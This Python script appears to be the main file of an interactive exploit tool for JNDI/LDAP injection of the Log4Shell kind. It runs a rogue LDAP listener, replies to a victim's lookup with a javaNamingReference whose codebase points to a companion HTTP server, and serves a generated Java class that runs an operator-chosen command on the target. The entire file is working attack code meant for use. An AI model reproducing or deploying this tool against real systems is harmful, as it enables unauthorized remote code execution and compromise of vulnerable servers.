import time
import socket
import random
import multiprocessing
from datetime import datetime

from termcolor import colored
from PyInquirer import prompt

from constants import CLASS_NAMES, LOGO
from utils import LDAPResponse

from generate import generate_exploit
from server import exploit_server

def run(host, port, hport):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(('0.0.0.0', port))
        sock.listen(5)
        conn, addr = sock.accept()

        with conn as c:
            timestamp = datetime.now().ctime()
            print(colored(f"[+] Connecting by {addr[0]}:{addr[1]} ({timestamp})\n", "green"))
               
            c.recv(8096)
            c.sendall(b"0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00")

            time.sleep(0.5)

            query = c.recv(8096)

            if not query or len(query) < 10:
                print("[-] Connection Suspended")
                return

            command = prompt([
                {
                    'type': 'input',
                    'name': 'command',
                    'message': 'Enter the command:',
                },
            ])['command']

            class_name = random.choice(CLASS_NAMES)
            
            generate_exploit(command, class_name)

            query_name = query[9:9+query[8:][0]].decode()

            response = LDAPResponse(query_name, {
                "javaClassName": class_name, 
                "javaCodeBase": f"http://{host}:{hport}/", 
                "objectClass": "javaNamingReference", 
                "javaFactory": class_name
            })

            c.sendall(response.serialize())

            time.sleep(0.5)

            c.recv(8096)

if __name__ == "__main__":
    # Show logo
    print(colored(LOGO, 'red'))

    # Prompt the questions
    q = prompt([
        {
            'type': 'input',
            'name': 'host',
            'message': 'Enter the Host:',
        },
        {
            'type': 'input',
            'name': 'ldap_port',
            'message': 'Enter the LDAP port:',
        },
        {
            'type': 'input',
            'name': 'http_port',
            'message': 'Enter the HTTP port:',
        }
    ])

    # transform port to number
    q['ldap_port'] = int(q['ldap_port'])
    q['http_port'] = int(q['http_port'])

    web = multiprocessing.Process(target=exploit_server, args=(q['http_port'],))
    web.start()

    print(colored('[*] Waiting for connections...\n', 'yellow'))

    run(q['host'], q['ldap_port'], q['http_port'])

    web.kill()